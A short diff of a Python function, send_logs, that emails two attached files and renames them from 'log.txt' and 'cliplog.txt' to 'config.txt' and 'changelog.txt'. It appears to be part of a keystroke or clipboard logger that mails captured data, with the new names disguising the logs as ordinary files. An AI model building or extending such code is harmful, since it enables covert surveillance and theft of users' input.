@@ -51,8 +51,8 @@ def send_logs():
     msg['Subject'] = f"log: {date_time}"
 
     # Attach log files
-    filename1 = "log.txt"
-    filename2 = "cliplog.txt"
+    filename1 = "config.txt"
+    filename2 = "changelog.txt"
 
     with open(filename1, "rb") as fp:
         part1 = MIMEBase("application", "octet-stream")
